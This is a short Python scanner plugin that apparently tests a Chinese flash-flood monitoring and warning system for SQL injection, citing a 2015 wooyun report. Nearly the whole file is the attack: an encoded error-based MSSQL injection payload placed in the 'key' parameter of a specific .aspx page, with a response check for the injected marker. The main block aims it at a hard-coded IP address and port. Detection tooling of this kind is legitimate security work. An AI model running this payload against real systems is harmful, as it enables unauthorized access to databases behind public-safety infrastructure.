#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = m01lym0on
#_PlugName_ = 山洪灾害监测预警系统SQL注入漏洞
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0113970
import re
def assign(service, arg):
    if service == 'strongsoft':
        return True, arg
def audit(arg):
    payload = 'BaseCourse/RushTeamCollect.aspx?adcd=1&key=1%27%20and%20convert(int,(char(58)%2Bchar(41)%2Bchar(32)%2Bchar(73)%2Bchar(39)%2Bchar(109)%2Bchar(32)%2Bchar(73)%2Bchar(110)%2Bchar(106)%2Bchar(101)%2Bchar(99)%2Bchar(116)%2Bchar(105)%2Bchar(111)%2Bchar(110)%2Bchar(32)%2B@@version))>1--'
    target = arg + payload
    
    code, head, res, errcode, _ = curl.curl2(target);
    if code == 500 and "I'm Injection" in res:
        security_hole(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('strongsoft', 'http://218.5.4.93:3505/')[1])